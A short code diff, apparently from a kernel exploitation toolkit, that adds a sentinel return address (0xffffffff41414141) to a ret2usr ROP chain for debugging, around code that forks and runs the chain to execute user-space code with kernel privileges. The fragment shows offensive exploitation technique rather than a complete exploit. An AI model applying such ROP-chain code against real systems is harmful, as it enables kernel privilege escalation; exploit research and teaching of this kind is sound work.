@@ -140,6 +140,8 @@ public:
         if (!fork()) {
             auto rop = GetRopChain();
             RopUtils::Ret2Usr(rop, (void*)&ret2usr_kernel);
+            // this should not run, but if it does then the crash helps debugging
+            rop.Add(0xffffffff41414141);
             ExecuteRopChain(rop);
         } else if (!check_fork(133))
             throw ExpKitError("Could not run code via RET2USR.");
